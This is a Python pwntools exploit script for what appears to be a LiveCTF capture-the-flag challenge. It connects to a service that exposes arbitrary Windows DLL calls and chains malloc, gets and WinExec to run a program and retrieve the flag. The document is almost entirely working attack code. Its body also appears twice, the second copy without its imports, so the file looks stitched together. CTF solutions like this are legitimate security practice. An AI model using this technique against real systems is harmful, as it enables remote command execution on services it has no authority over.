#!/usr/bin/env python3
import os

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.log_level = "debug"

io = remote(HOST, int(PORT))

def c(module, f, a, no_recv=False):
    io.sendlineafter("?\r\n", module)
    print(io.recvuntil("\n"))
    print(io.recvuntil("\n"))
    io.sendlineafter("?\r\n", f)
    print(io.recvuntil("\n"))
    io.sendlineafter("?\r\n", "%d" % a)
    if no_recv:
        return
    print(io.recvuntil("Result: "))
    return int(io.recvuntil("\r\n", drop=True), 16)

addr = c("msvcrt", "malloc", 256)
c("msvcrt", "gets", addr, no_recv=True)
io.sendline(".\\submitter")
c("kernel32", "WinExec", addr)

io.interactive()
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.log_level = "debug"

io = remote(HOST, int(PORT))

def c(module, f, a, no_recv=False):
    io.sendlineafter("?\r\n", module)
    print(io.recvuntil("\n"))
    print(io.recvuntil("\n"))
    io.sendlineafter("?\r\n", f)
    print(io.recvuntil("\n"))
    io.sendlineafter("?\r\n", "%d" % a)
    if no_recv:
        return
    print(io.recvuntil("Result: "))
    return int(io.recvuntil("\r\n", drop=True), 16)

addr = c("msvcrt", "malloc", 256)
c("msvcrt", "gets", addr, no_recv=True)
io.sendline(".\\submitter")
c("kernel32", "WinExec", addr)

flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)